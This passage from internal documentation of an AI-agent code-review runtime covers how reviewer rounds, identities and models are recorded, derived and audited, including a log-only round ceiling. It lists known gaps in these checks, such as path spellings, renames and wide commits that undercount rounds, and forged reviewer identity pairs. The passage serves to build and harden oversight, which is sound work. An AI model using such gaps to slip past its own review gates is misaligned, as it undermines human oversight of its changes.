second warm round), which is kept in History. Its recording mechanics survive and are described
next.

What gets **recorded** after a targeted round is identical to any other round —
`record_review.py <repo> --pre-commit --clean --paths <paths> --reviewer <agent-type>
--reviewer-agent-id <id> --reviewer-tool-use-id <id> < /dev/null`, once the falsifiability check
and the full suite both pass — the same reviewer-identity triple as "Clearing the gate" above,
copied from the dispatch row, never retyped. (Warm FULL rounds carry additional chain-identity
fields — see the warm section below; targeted rounds do not.) Gate 3b re-fires on every edit purely by content digest; it has no separate
ledger state for "this was a targeted vs. a full round" — that distinction lives entirely in the
orchestrating session's own round-counting discipline, and the two-targeted-round cap of the earlier ladder
(retired by batch reviews, above) was never enforced by any mechanism.

**Full re-review rounds run WARM (2026-08-30, adopted instead of the rejected gate-optimization
Item 7 — #4686).** When the ladder escalates a fix round to a full re-review, continue the
round-1 reviewer agent in-context (SendMessage) instead of dispatching cold — same full-review
bar and blocker authority, warm-context cost. The continuation message re-scopes the reviewer to
the FULL current pending diff (`git diff HEAD -- <paths>`, re-read fresh), never to "confirm the
reported fixes" — a narrowed continuation prompt is a confirm-only round wearing a full-round
label, and is not sanctioned — and the warm round re-examines hunks it cleared in the prior round
(fixes may have edited them) and re-runs the relevant quick test itself. Three bounds: (a) before
EVERY warm round, re-run `review_risk_tier.py` on the full current pathspec and re-derive the
reviewer-of-record — if EITHER changed (a risk-tier flip, or a fix newly touching a trust surface
→ `trust-architect`, substituting), the chain breaks and the round is a fresh COLD round-1
dispatch; the re-check is the trigger, never a step inside a branch reached after already knowing
the answer; (b) a reviewer that is no longer continuable (session ended, context exhausted,
different session, scheduled-job reviewer, or a dispatch shape that does not support continuation
— measured 2026-08-30/31: a plain FOREGROUND dispatch IS continuable by agent id, 6 of 6 that
night; background, worktree-isolated and cross-session are UNVERIFIED in either direction — treat
a failed continuation as non-continuable) means a COLD full dispatch — the fallback, never a
downgrade; (c) at most TWO consecutive warm rounds per boundary — one boundary = one continuous
fix-round chain on the same pending commit, regardless of digest changes — then the next full
round is COLD (the independence backstop — a warm reviewer grades fixes it prescribed).

Since 2026-10-09 (batch reviews, above) a capped warm reviewer is followed by a targeted check
rather than a fresh full cold round. The cap itself is enforced mechanically: `record_review.py`
refuses to record a warm round (`--warm` together with `--prev`) when two consecutive warm rounds
already sit on that `prev=`-linked chain (`_MAX_CONSECUTIVE_WARM_ROUNDS = 2`). The refusal prints
`REFUSED`, records nothing, and logs `warm-cap-exceeded` to the enforcement ledger, where
`churn_report.py` counts it. The targeted-round cap of the earlier ladder was never tracked by any
mechanism.

RECORDING a warm round: pass
the FULL chain-identity field set — `--round <n> --reviewer <type> --reviewer-agent-id
<round-1 agent id> --reviewer-tool-use-id <round-1 tool_use_id> --prev precommit:<digest>` (the
prior round's ledger key exactly as written, never the bare digest). `--prev` alone is not
enough: the exemption below chains on `round=` + `prev=`, and an entry without the re-cited
round-1 identity lands as `no-identity`, a flagged shape the exemption never covers. Copy
identity pairs from the dispatch record — never retype them; a single-character typo lands as a
permanently-unmatched forgery-shaped entry (live instance: 2026-08-31). Scope
clarifications: TARGETED rounds are out of scope for warm/cold and never consume the warm cap
(the refusal counts consecutive `warm=1` entries on one `prev=` chain; any entry recorded
without `--warm`, a cold full round or a targeted check, ends the run; a `--warm` recording with
no `--prev` is never checked; and the refusal itself exits 0); bound (a) fires on a change in
EITHER direction (a boundary that stops being trust-surface breaks the chain too). Known
interaction: `audit_review_attribution.py` currently reads a re-cited reviewer identity-pair as
forgery-shaped; a warm chain re-cites round 1's pair by construction — the auditor exemption
(successive `round=` values on one `prev=`-linked chain — never a repo+digest grouping, which
cannot chain across rounds since each fix moves the digest — plus its lease-time window for a
re-cited round-1 identity) is a blocking follow-up on #4686. Until it lands: Exempt ONLY (i)
a `reused` or `unmatched` verdict on an entry that is a successive `round=` value on a
`prev=`-linked chain, where — for `unmatched` — the cited (agent_id, tool_use_id) pair EXISTS
somewhere in `~/.claude/.agent_budget/spend.jsonl` (window-ignored; a pair that appears NOWHERE
is a real mismatch and is always relayed); and (ii) a `reused` or `unmatched` verdict on a warm-shaped entry whose ledger `ts=`
predates 2026-08-31 (the field mandate's landing date) — a hard date, never "before the mandate
existed". Everything else in the verdict classes STANDS and is relayed — a `no-identity` entry is
NEVER exempt on this ground alone (see the RECORDING paragraph above: an entry missing the
re-cited round-1 identity lands as `no-identity`, which the exemption never covers), and the
verdict class as a whole is never voided.

## The review-round ceiling (WS2.3, master plan §2.3) — LOG-ONLY as of 2026-09-21

**File:** `hooks/record_review.py` (`derive_review_round()`, the `_ROUND_TRIPWIRE`/
`_MAX_TOTAL_ROUNDS` constants, and the wiring inside `main()`'s `--pre-commit` branch).

What the operator remembered as "three rounds" is the 3-strike rule (`CLAUDE.md` §11) — a
different mechanism entirely (it stops an agent from retrying the *same failing check* a fourth
time). Nothing anywhere mechanically counted, or capped, how many times *one review boundary's*
fix-and-re-review loop could run before this landed. This is that mechanism's first half: the
recorder now DERIVES a round number for every `--pre-commit` recording and logs what a future
enforcing version would refuse — but **refuses nothing yet**.

### LOG-ONLY, deliberately, for a 7-day observation window

The master plan's own §2.3 mandates this: land the derivation and the would-refuse logging first,
observe real ledger data for 7 days, then hand-check every `round-tripwire-would-refuse`/
`total-round-cap-would-refuse` line before ever shipping a version that actually denies a commit.
Enforcement ships **only if** ≥90% of the window's would-refuse lines are true same-boundary
chains **and** none arose solely from a shared hot file (a path touched by ≥3 sessions' records
that week) — otherwise the overlap rule narrows (to "shares ≥50% of the pathspec" instead of any
overlap at all) and the window restarts. That go/no-go decision, and the refusal mechanism itself,
are a **separate, later commit** — not built here. Every code comment and every test in this
landing says so explicitly, so a future reader never mistakes this for a live gate.

### The round is DERIVED, never declared

This mirrors `tier=`/`model=`'s own "always computed, caller value is audit-only" precedent
exactly (see "The reviewing model is derived, not declared" above) — for the identical reason: a
caller's own `--round` binds almost nothing, since nothing before this stopped any caller from
typing any number at all. `derive_review_round(last_reviewed_path, repo_root, raw_paths)` walks
**this repo's own ledger history**, in on-disk (chronological, append-only) order, for every
`precommit:`-keyed entry whose own `paths=` telemetry field **overlaps** `raw_paths`:

- **Overlap reuses `file_claims.paths_overlap` verbatim** — never a second, independently-written
  comparison (the task's own explicit requirement). This is the same prefix-aware, directory/
  file-safe predicate the commit-contest ledger already uses for "does this commit touch a path
  someone else is mid-commit on" — a directory-scoped `--paths` correctly overlaps a file inside
  it, and vice versa.
- The walk counts **entries**, not per-entry finding counts: `derived_round = (count of
  --blockers ENTRIES found, walking back to the latest --clean covering these paths) + 1`. A
  round that reported 5 blocker findings and a round that reported 1 are both still exactly one
  review ROUND — `blockers:5`'s own `n` value is read (and validated) but never summed into the
  round count.
- **A `--clean` entry closes the chain.** Anything recorded after it (later in the file) starts a
  fresh count — a boundary reviewed clean and never touched again does not inflate an unrelated,
  merely-overlapping later commit's round.
- **Two genuinely disjoint paths never share a chain** — `paths_overlap` is what enforces this; a
  brand-new boundary with no ledger history at all derives round 1.
- Fails toward round 1 on any read failure (unreadable ledger, malformed line, an unexpected
  exception) — the same safe-failure direction as the rename gap below: an instrumentation
  failure must never itself manufacture a false HIGH round that could trigger a would-refuse log
  for a chain that never really ran that long.

`--round` stays **optional and audit-only**: when the caller supplies one and it disagrees with
the derived value, that disagreement is logged (`round-mismatch`, with `declared=`/`derived=`) —
but the DERIVED value is always what actually gets written to the ledger's `round=` field. **No
record is ever refused for a missing `--round`** — `round=` was present on only ~37% of real
ledger lines when this was written, and no documented recipe passes it for round 1; requiring it
would have denied most commits, which is not what this change does.

### The would-refuse log lines

Two named constants, both **thresholds for a LOG line, never a gate**, in this landing:

- `_ROUND_TRIPWIRE = 3` — a derived round crossing this logs `round-tripwire-would-refuse`
  (`derived_round=`, `blockers_found=`). A future enforcing version would require
  `--strategy-change <cold-reviewer|codex-consult|targeted-falsification>` starting here.
- `_MAX_TOTAL_ROUNDS = 5` — a derived round exceeding this (round 6+) logs
  `total-round-cap-would-refuse` instead of the tripwire reason (never both — the two are
  mutually exclusive per call, the higher threshold's reason wins). A future enforcing version
  would refuse outright here, with a narrow, logged escape (`--strategy-change` +
  `--round-cap-ack <issue#>`) for rounds 6–7 and no escape at all for round ≥8.

Both checks run **unconditionally** for every `--pre-commit` call — never gated on
`_lib.enforcing()`, which governs only whether the ledger *write* itself happens for the normal
record/update decision. Deriving and logging the round is pure observation; the LOG-ONLY posture
here is a *different, always-on* axis from that pre-existing enforcing/LOG-ONLY split.

### The rename gap — a known, accepted v1 limitation, never left silent

**This v1 does not follow a rename across the chain** via `git diff --find-renames`. Overlap is
computed purely from a ledger entry's own `paths=` telemetry field — the literal path strings a
prior recording call happened to be invoked with. There is no mechanism here (and none realistic
against this flat, digest-keyed text ledger) to recognize that `new_name.py` in a later call's
`--paths` is the renamed continuation of `old_name.py` in an earlier entry's `paths=`. A rename
mid-chain therefore **undercounts** the derived round — the walk simply finds no overlapping
predecessor and starts a fresh round 1, rather than continuing the real chain. This is the safe
failure direction (a false LOW round, never a false HIGH one that could itself trigger a
would-refuse log for a chain that never really ran that long) but is a real, accepted limitation,
stated here and in `derive_review_round()`'s own docstring — never left silent. Implementing real
rename-following is a follow-up, not built here.

### The path-spelling gap — the same standing as the rename gap, also never left silent

`--paths` is both SANITIZED (`_safe_path_component`, matching how a ledger entry's own `paths=`
field was written) and NORMALIZED (`file_claims.normalize_path`, stripping a leading `./` and a
trailing `/`) before `paths_overlap` sees it. Both are required and they are not alternatives: an
earlier cut sanitized only, and because `paths_overlap` is a pure string-prefix predicate, one
boundary then derived DIFFERENT rounds by spelling — `hooks/record_review.py` gave round 2 while
`./hooks/record_review.py` and `hooks/` gave round 1, with `stopped_at_clean` disagreeing for the
same directory.

**Normalization is not canonicalization, and five spellings still break the chain:** `hooks//x.py`,
`hooks/./x.py`, an ABSOLUTE path, `../x/hooks/x.py`, and `hooks/../hooks/x.py`. `normalize_path`
does not collapse `//`, resolve `.`/`..`, or relativize an absolute path against the repo root.
Absolute paths are the realistic case — 2 of 4,749 live ledger lines (~0.04%) — and a mixed
absolute/relative chain silently **undercounts**.

Undercounting is the same safe failure direction as the rename gap, and the enumeration above is
NOT exhaustive — at least eleven further spellings undercount (`.//x`, `.././x`, `hooks/.`,
whitespace-padded, backslash separator, case variance, `.`, `./`, a glob, the `:/` magic pathspec).
The RULE, rather than the list: **normalization is not canonicalization.**

### Overcount is also reachable (the unsafe direction)

The undercount gaps above are the safe direction. The unsafe direction is real too: `paths_overlap`
has union semantics, evaluated in BOTH directions against the recorded `paths=` telemetry, so ANY
shared path merges chains, and a derived round can exceed the true round. It is reachable from the
caller's pathspec (a shared hot file such as `README.md`, a directory-scoped commit that overlaps
every sibling chain beneath it, a multi-path commit spanning two open chains) and from the recorded
side (a directory-scoped pathspec in an earlier entry captures every later single-file call beneath
it; a multi-path "bridge" entry transitively merges two chains that never shared a path). Because
both sides are evaluated, no fix that inspects only the caller's pathspec can be complete. This is
why the feature is log-only and why this must be resolved before enforcement. The reproductions, the
live-ledger replay figures and the earlier claim this page had to retract are in History.

### A third UNDERCOUNT shape, alongside the rename and wide-commit gaps

A clean entry covering only PART of a multi-path commit resets the whole count:
`blockers[a.py]`, `blockers[b.py]`, `clean[a.py, b.py]`, then a call of `['b.py']` derives 1 — even
though b.py's own chain was never individually cleared. Safe direction, reachability proven,
incidence unmeasured.

This is why the feature is LOG-ONLY. It **must** be resolved before enforcement, since enforcement
is gated on an observation window this corrupts by construction. Tracked on #5828.

#### Reproducing these numbers — `scripts/replay_review_rounds.py`

The figures in the **table below** are regenerable by the flags in their row. The older figures
earlier in this section (the 19-tripwire census, the 48 directory-shaped paths, the peak-6 case)
**predate this tool and no flag combination reproduces them** — they measure the currently shipped
`paths_overlap` predicate's own defects, not the candidate, and were counted by hand. Do not read
the claim below as covering them:

```
python3 ~/.claude/scripts/replay_review_rounds.py    # the ADOPTED rule (see flags below)
python3 ~/.claude/scripts/replay_review_rounds.py --self-test  # needs NO ledger
python3 ~/.claude/scripts/replay_review_rounds.py --json
```

Read-only: it never writes the ledger, touches git, or calls the network.

**Population matters more than the totals.** The ledger holds ~4,758 lines, of which only **2,555**
are replayable (precommit-keyed, carrying `paths=`, with a clean/blockers outcome). Quote the
replayable count, never the raw line count.

**The output is PER REPO, deliberately.** The first attempt at the predicate fix replayed
`~/.claude` alone — 317 entries, 12% of the corpus — found no movement, and reported it as the
whole ledger. The per-repo split is what refutes that.

**Every figure below names the flags that produce it** — the defaults changed once already, and a
figure quoted without its variant is how the original error happened:

| variant | flags | ExampleApp changed (up) | ExampleApp ≥3 | ExampleApp peak | Agency peak | verdict |
|---|---|---|---|---|---|---|
| pure subset (rejected) | `--reset-predicate same --trunc-fallback none` | 172 (103↑) | 76→**93** | 7→6 | 7→**9** | NOT monotone |
| **adopted** | *(defaults)* `--reset-predicate overlap --trunc-fallback half-sample` | 58 (**0**↑) | 76→58 | 7→6 | 7→7 | **MONOTONE** |

The rejected variant's *rising* ExampleApp tripwire population (76→93) and **Agency's** peak of 9 — into
the ≥8 band the master plan refuses with no escape — are what ruled it out. Note the peak columns
are per repo: ExampleApp's peak falls under both variants, so a single "peak" column would have
attributed Agency's 9 to ExampleApp. The adopted rule moves every figure downward and the tool **exits 1** if any rule it is asked
to replay manufactures a higher round.

Two directions, read differently: an **UP** move is the risk direction (a round rises when a CLEAN
entry stops closing the chain, manufacturing a false-high round); a **DOWN** move is the intended
correction. The tool prints both counts and says which is which.

`--self-test` checks the predicate shape table without a ledger, but it does **not** cover ledger
parsing or the chain walk — both blockers found in review lived there. `hooks/tests/test_replay_review_rounds.py`
carries the differential test that keeps `derive()` faithful to `derive_review_round`.

### The wide-commit gap — a third way the chain breaks, also stated rather than left silent

`_paths_field` records at most `_MAX_PATHS_IN_FIELD = 12` paths per ledger entry. A commit touching
more than twelve stores only the first twelve, so a later round of the SAME boundary that names only
path #13 or beyond finds no overlapping predecessor and derives round 1. This is reachable: gate 3's
own sweep ceiling is 30 paths, so a 13-to-30-path commit is permitted and undercounts.

Same safe direction as the rename gap, same accepted-for-v1 standing, same requirement that it be
understood before enforcement reads these numbers as truth.

### What metric 7 now sees — disclosed, because the population changed

Every `--pre-commit` record now carries a derived `round=` where roughly 37% of lines did before.
Measured by simulating `churn_report.py` metric 7 over the live ledger: chains counted rise
1,169 → 1,325 (+13%), and the single-round-chain share roughly doubles, 18.5% → 31.7%, because each
`round=`-carrying, `prev=`-less entry becomes its own one-round chain under that module's rules.

That is a DILUTION of "rounds-per-boundary", not a corruption — but a reader comparing this week to
last week would otherwise see the convergence figure move and reasonably misread it as a regression
in review quality. It is the measurement population that changed, not the reviews.

### Tests

`hooks/tests/test_record_review.py` — `derive_review_round`'s own pure-function group (fresh
chain, missing ledger, a blockers→blockers→clean chain incrementing correctly at each step, a
clean entry resetting the chain, non-overlapping paths never sharing a chain, directory-prefix
overlap, repo-root scoping, the `file_claims.paths_overlap` reuse proven by a spy, and a swallowed
internal error defaulting to round 1) plus `main()`-level end-to-end coverage (round 1 with no
declared round, a matching declared round, a disagreeing declared round logging
`round-mismatch` while the derived value still governs and the record still lands, the round-3
tripwire log with the record still landing, the round-6 total-cap log with the record still
landing, a clean review resetting a later chain to round 1, and disjoint paths never sharing a
round count).

## Substitution, never stacking

`trust-architect` (Opus) is the reviewer-of-record for a **trust-surface** commit — anything
touching `modules/billing/`, `modules/licensing/`, `modules/stripe_module/`,
`firestore.rules`, or auth wiring (per this project's own `CLAUDE.md`) — and it **substitutes
for** `code-reviewer` there rather than running in addition to it. This is a deliberate
constraint, not an oversight: stacking two full Opus reviewers on the same commit boundary would
double the cost of the boundary without adding a second, genuinely independent review point —
the two-boundary rule (`CLAUDE.md` §10) exists precisely to keep the number of standing review
points fixed and small. `model_policy.json`'s `session_rules.review_ladder` encodes this
directly: `"one reviewer per boundary - substitution never stacks"`.

## The review ledger's format

**Location:** `~/.claude/.review_state/last_reviewed` (a flat text file — not JSON) plus, for
plan review, `~/.claude/.review_state/plan_reviews.jsonl` (append-only JSONL). Both live under a
`0700`-permission directory the tooling creates and chmods itself
(`_append_entry`/`_update_entry` in `record_review.py`).

> **Citation convention in this file: SYMBOL, never line number.** Every reference to
> `record_review.py` names a function, class or constant, because a line number rots the
> moment anything is inserted above it and NOTHING in this runtime validates one. That is not
> hypothetical: on 2026-09-21 this file carried nine `record_review.py:<line>` citations and
> **every one was wrong** — `_append_entry` was cited at 840-881 and actually lived at
> 1688-1729, `decide()` at 699-839 and actually at 1526-1687, `ArgvError` at 122 and actually
> at 178. They had drifted silently, and were found only because a reviewer happened to check
> them by hand. A symbol survives every insertion and is greppable; prefer it here and
> everywhere else in these docs (#5843).

### `last_reviewed` line grammar

The module's top-of-file docstring (`record_review.py`, the `Behavior (spec):` block) documents the original three
outcome shapes (unspecified / `clean` / `blockers:<n>`); the fuller current grammar — a set of
OPTIONAL trailing `` k=v`` telemetry fields appended after the outcome token, added in the
2026-08-30 gate-optimization pass — is documented separately in `_entry_suffix`'s own docstring
(`_entry_suffix`'s docstring in `record_review.py`), not the module docstring. Example lines in both shapes, copied from a real
ledger (2026-08-30):

```
/Users/x/Desktop/ExampleApp precommit:94865754d5a4d5db
/Users/x/.claude precommit:d9c9f0e26f19fd45 clean ts=2026-08-30T21:05:02Z tier=high reviewer=code-reviewer model=opus round=4 paths=hooks/validate_agentarch_ledger.py#hooks/agentarch_metric_check.py#hooks/tests/test_validate_agentarch_ledger.py#hooks/tests/test_agentarch_metric_check.py#knowledge/repo_registry.json#knowledge/oversight_install.md#schedules/prompts/daily_sweep.txt#commands/sweep.md paths_n=8
/Users/x/.claude precommit:0f5efda7923af3fc blockers:2 ts=2026-08-30T21:17:27Z tier=high paths=knowledge/agentic_systems_architect_primer.md#agents/agentic-systems-architect.md#CLAUDE.md#knowledge/agentic_patterns_evidence_2026_08_30.md paths_n=4
```

Two layers coexist on the same line, both byte-for-byte findable by any consumer that only cares
"was this HEAD reviewed at all" (the needle is always a prefix match):

- `"<repo_root> <sha_or_precommit_key>"` optionally followed by `" clean"` or `" blockers:<n>"` —
  the same three original shapes as before: outcome-unspecified (every pre-existing line, and any
  caller that still passes no outcome), `clean`, or `blockers:<n>` (what **keeps gate 3b closed**).
- Zero or more trailing `` k=v`` telemetry fields, appended ONLY on an outcome-bearing line, each
  independently optional: `ts=` (present whenever any outcome is recorded), `tier=` (the risk
  tier `review_risk_tier.classify()` computed for the reviewed pathspec — always COMPUTED, never
  trusted from a caller-declared `--tier`), `tier_declared=` (audit-only: populated only when a
  caller's `--tier` disagreed with the computed value), `reviewer=` (either a bare reviewer-type
  string, or — as of gate-optimization Item 6b — a compound `<type>#<agent_id>#<tool_use_id>`
  identity written via `--reviewer-agent-id`/`--reviewer-tool-use-id`, joined with `#` and parsed
  back by `parse_reviewer_value()`; see `hooks/audit_review_attribution.py` for what consumes this
  and the honest limits of what it can prove), `model=` (2026-09-20, master plan WS2.4 step 1 —
  **DERIVED on a `--pre-commit` line, scope-limited** — see the correction below): one of
  `opus`/`sonnet`/`haiku`/`fable`, joined from `~/.claude/.agent_budget/spend.jsonl` against the
  entry's own `reviewer=` identity when the recording that produced the line used `--pre-commit` —
  see "The reviewing model is derived, not declared" below for the full mechanism. **This is NOT
  true of every line on the ledger**: derivation is scoped to `--pre-commit` recordings only (and
  `--correct-identity`, which re-derives — see below). A non-`--pre-commit` `--clean --model opus`
  recording, and a `--rekey` whose ROOT entry predates 2026-09-20, both still carry a genuinely
  self-reported `model=` forward — **the tell is `model_source=`: present and `ledger` iff `model=`
  was actually derived; absent means `model=`, if present at all, is a legacy/plain self-report, not
  a verified join.** `model_source=` (present and always `ledger` whenever `model=` was populated
  from a successful join; absent when `model=` itself is absent, OR when `model=` is a self-report
  from before this field existed), `model_id=` (the RAW spend.jsonl model string, SANITIZED the same
  way `reviewer=`/`corrects_from=` are — e.g. the raw ledger value `claude-opus-5[1m]` is written as
  `claude-opus-5_1m_` (`_SAFE_FIELD_RE` maps `[`/`]` to `_`, since `[`/`]` are outside the ledger's
  safe `k=v` charset) — audit trail only, never re-parsed back into the bracketed form), `model_declared=`
  (audit-only: populated when a caller's own `--model` flag disagreed with a SUCCESSFULLY derived
  value, mirroring `tier_declared=`'s contract exactly — **and ALSO when nothing could be derived at
  all but the caller still declared a `--model`** (`record_review.py`'s own comment at the
  no-derivation branch of the `--pre-commit` wiring makes this explicit): in that second case
  `model=`/`model_source=` are both absent and `model_declared=` is the ONLY model signal on the
  line. `--correct-identity` ALWAYS clears `model_declared=` on the corrected line regardless of
  which of these two shapes produced it on the original — a correction never carries a caller
  declaration forward, since `--model` is refused outright alongside `--correct-identity` (fixed
  2026-09-20 fix round, finding 2: this was a real regression — the field previously survived a
  correction byte-for-byte, so correcting to a bare `--reviewer` type left a stale
  `model_declared=` as the only model signal, and correcting to an identity whose re-derived model
  happened to equal the old declaration wrote `model=X model_declared=X`, both violating this
  field's own "only when it disagreed" invariant), `round=` (integer — tracks the fix-round-cap discipline in `CLAUDE.md`
  §10), `paths=`/`paths_n=` (up to 12 `#`-joined sanitized paths, plus the TRUE total count so
  overflow beyond the cap is visible rather than silently truncated), `prev=` (the prior
  review's ledger key, `precommit:<digest>` — what links a warm re-review round's entry to its
  round-1 entry, and — with `round=` — what the #4686 auditor exemption chains on), `vf=` (one of
  `verify_fix.py`'s seven closed verdict tokens: `PROVEN`/`PARTIAL`/`FALSE_ALLCLEAR`/
  `CLAIM_FALSE`/`ERROR`/`NOTHING_TO_FALSIFY`/`STALE_BUNDLE`), `rekey=` (added 2026-09-01,
  AA-0064 fix round Item 8 — the PRIOR `precommit:<digest>` key a `--rekey` call carried this
  entry's clean outcome forward from; present ONLY on an entry `--rekey` produced, never on a
  genuinely fresh review. This is the audit-visible line between a sanctioned mechanical
  carry-forward and an unattributed/self-cleared clean — `audit_review_attribution.py` needs it to
  stop treating a --rekey entry's own carried-forward `reviewer=` identity as unattributed),
  `dg=` (added 2026-09-24, GH #5886 fix-round-4 R7-B1 — a digest-format VERSION marker,
  `record_review._DIGEST_FORMAT_VERSION`, currently `"2"`; written ONLY by the `--pre-commit` and
  `--rekey` write paths, never on a plain unspecified/legacy recording. `dg=2` says this entry's
  digest was computed using `precommit_review_gate._digest_safe_name`'s control-character-safe
  rendering — i.e. it is safe to treat as a `--rekey` CHAIN ROOT. `--rekey` refuses outright unless
  the chain's resolved ROOT already carries `dg=2`; an entry with no `dg=` at all — every entry
  recorded before this fix existed, by construction — reads as "may predate the current rendering"
  and refuses, fail-closed. See `_entry_suffix`'s own docstring for the full contract and the
  `--rekey` section above for why this exists), and `corrects_from=`/`corrected_at=` (added
  2026-09-09, #5133 — see the `--correct-identity`
  section above: `corrects_from=` names the OLD `reviewer=` value a `--correct-identity` call
  superseded, and `corrected_at=` is a UTC ISO8601 timestamp of WHEN the correction itself
  happened — a field SIBLING to `ts=`, never a mutation of it. `ts=` on a corrected line always
  stays the ORIGINAL entry's dispatch time, byte-for-byte. `corrected_at=` exists SO THAT a
  `--window-seconds`-keyed consumer CAN evaluate a correction against the right window — note
  that as of 2026-09-09 `audit_review_attribution.py`'s own join still keys on `ts=` (a day-8
  correction citing a day-1 review's `ts=` joins against day-1 `spend.jsonl` rows); the field
  makes that discrepancy visible to a human reader, and wiring the join to prefer `corrected_at=`
  on `corrects_from=`-bearing entries is an open follow-up, not shipped behavior).
  A field absent from a given line means unknown for that line, never a guessed real value (a
  missing `tier=` reads as `TIER_UNKNOWN`, never "moderate").
- A wholly separate line shape, `` battery:<ts> mut=<caught>/<total> stale=<n>``, records a
  mutation-battery run result (`BATTERY_PREFIX`/`_battery_entry` in `record_review.py`).
  It carries no `repo_root`/digest key at all — it isn't gating a specific commit —
  so it structurally can never collide with, or be misparsed as, a `precommit:` entry. The shape above is read
  directly from source, not from an observed example.

### The reviewing model is derived, not declared (WS2.4 step 1, 2026-09-20)

**Tier is derived (`review_risk_tier.classify()`); the reviewing MODEL now is too, and for the same
reason.** `--model` is self-reported — before this change, whatever value a caller typed was written
straight to the ledger's `model=` field with no verification at all, exactly the "trust the caller"
shape `tier=`'s derivation already existed to avoid for risk tier. This closes the identical gap for
model.

**The mechanism (`derive_reviewing_model()`, `record_review.py`):** for a `--pre-commit` recording
carrying `--reviewer-tool-use-id` (optionally paired with `--reviewer-agent-id`), the recorder joins
that identity to a row in `~/.claude/.agent_budget/spend.jsonl` — the SAME ledger
`hooks/audit_review_attribution.py` already joins against for its own offline audit, and the same
`(agent_id, tool_use_id)` compound-identity contract Item 6b established (a `tool_use_id` alone is
the primary key; a supplied `agent_id` must also agree, or the row is treated as no match at all,
never a partial/best-effort join — a copy-pasted or forged `tool_use_id` with a mismatched
`agent_id` is exactly the shape this refusal-to-partial-match exists to catch). A matched row's
`model` field (falling back to `model_requested` when `model` itself is absent, mirroring
`agent_budget.py`'s own reap-time fallback) is normalized to a short tier word — `opus` / `sonnet` /
`haiku` / `fable` — via `normalize_model_tier()`, which reuses `cycle_budget.normalize_model` (this
runtime's own cost-accounting normalizer) rather than re-deriving a second family-matching table.
**The derived value governs.** `--model` stays optional and is written to the ledger ONLY as
`model_declared=`, an audit-only field, and ONLY when it disagrees with what was actually derived —
never trusted over the ledger, never silently dropped either. A disagreement additionally logs
`model-mismatch` (`declared=`/`derived=`) to `~/.claude/.enforcement/log.jsonl`.

**Scan bound.** The join scans `spend.jsonl` from the END, bounded to the last 20,000 raw lines
(`_SPEND_JOIN_SCAN_LINES`) — a real dispatch's own row is always near the end of this large,
ever-growing, machine-wide ledger, so a hit within the bound is found cheaply and a full-history
scan on every `--pre-commit` recording (the hot path gate 3b sits in front of) is avoided. A row that
exists but falls outside the scanned window is reported `unjoinable`, the same reason code as a row
that genuinely does not exist — never a silent, unexplained "not found." The byte window that
implements this line bound is `scan_lines * _AVG_LINE_BYTES` (a seek-from-the-end, not a full read);
`_AVG_LINE_BYTES` is **512** (fixed 2026-09-20 fix round, nit 8 — measured against the real
`~/.claude/.agent_budget/spend.jsonl`, 15,443 rows: mean row size 438B, p99 472B, max 480B; the
original 400B estimate was BELOW the measured mean, so the byte window actually covered only
~18,250 real lines, not the documented 20,000 — 512B clears the measured p99 with headroom).

**The 14-day warn-only window (step 1 of 2 — refusals are step 2, a later commit).** A
`--pre-commit` recording whose reviewer identity is missing (`no-identity`, no
`--reviewer-tool-use-id` at all) or unjoinable (`unjoinable` — wrong id, agent-id mismatch, or
beyond the scan bound; `ledger-unreadable` — `spend.jsonl` itself is missing/unreadable;
`unrecognized-model` — a row matched but its own model string didn't normalize to anything this
ledger's vocabulary knows) logs exactly ONE `missing-reviewer-identity` line
(repo/key/reviewer-type/reason) to the enforcement log. **The record is still written exactly as
before this change — nothing is refused.** This window opened when this change landed (2026-09-20)
and runs 14 days; step 2 (a HIGH-tier `--clean` whose derived model is below opus is REFUSED, per
`CLAUDE.md` §10/master-plan §2.4) is gated on ≥95% derived coverage over that window, not on the
calendar date alone — see the master plan's own §2.4 for the exact trigger condition. Both
`missing-reviewer-identity` and `model-mismatch` are logged only once a recording call actually
proceeds to write something NEW (`STATUS_RECORD`/`STATUS_UPDATE`, never `STATUS_ALREADY`) — the same
gating `tier-mismatch` already uses, so an idempotent retry of an already-recorded outcome never
double-logs.

**`--rekey` and `--correct-identity` interact with derivation differently, deliberately:**
- `--rekey` carries the ROOT entry's already-derived `model=`/`model_source=`/`model_id=` forward
  byte-for-byte, exactly like it already carries `reviewer=` forward — a rekey has no
  `--reviewer-tool-use-id` of its own to join with (it is reconstructing a PRIOR review's byte-
  identical content, not recording a new dispatch), so there is nothing new to derive.
- `--correct-identity` RE-DERIVES `model=`/`model_source=`/`model_id=`/`model_declared=` from the
  CORRECTED identity — these are the fields this correction mode does NOT carry forward byte-for-byte
  from the existing entry (every other field — outcome/paths/digest/round/prev/vf/tier/warm/rekey/
  `ts=` — stays untouched, per #5133 requirement (b)). A corrected `--reviewer-tool-use-id` names
  a genuinely different real dispatch than the one the original `model=` was joined from, so carrying
  the old value forward would leave a stale, silently-wrong tier attached to the corrected identity.
  When the corrected identity is a bare `--reviewer` type with no `agent_id`/`tool_use_id` pair
  (nothing to re-derive from), the now-unverifiable `model=`/`model_source=`/`model_id=` fields are
  REMOVED from the corrected line entirely, rather than left stale. **`model_declared=` is ALWAYS
  cleared to absent by a correction, in BOTH branches** (fixed 2026-09-20 fix round, finding 2 — a
  real regression: the field used to be silently carried forward byte-for-byte like the protected
  fields above, so a correction to a bare `--reviewer` type left a now-orphaned
  `model_declared=<value>` as the ONLY model signal on the line — never true of either the new or the
  old identity — and a correction whose re-derived model happened to equal the old declaration wrote
  `model=X model_declared=X`, violating this field's own "only when it disagreed" invariant). `--model`
  alongside `--correct-identity` remains refused outright (`_CORRECT_IDENTITY_INERT_FLAGS`) — a
  correction never accepts a caller-declared model, only a re-derived one.

**Recipe rollout.** The derivation has something to join on only when a recipe passes
`--reviewer-tool-use-id` (and `--reviewer-agent-id`); a recipe that passes only `--reviewer <type>`
degrades to the warn-only `no-identity` path, not a join. Every documented recipe that calls
`record_review.py --pre-commit` should pass the identity pair. Find them with `grep -rl
record_review.py` over the runtime and over the product repos' dossiers; the set drifts, so
re-derive it rather than trusting a list. The dated file list is in History.

The `~/.claude` `blockers:2` line above is a real, live example of this runtime's *own* review
gate catching unresolved findings against its own hooks code — direct evidence the mechanism
isn't a rubber stamp, at least for that instance.

**Argv validation is now loud, not silent** (2026-08-30, gate-optimization plan Item 6): an
unrecognized `--`-prefixed flag, or a positional target that doesn't look like a real (or
plausible not-yet-created) path, used to resolve silently to a bogus target — `decide()` then
correctly rejected it as "not a directory", and the call recorded nothing while still exiting 0,
indistinguishable from success to the calling agent (measured against the live enforcement log at
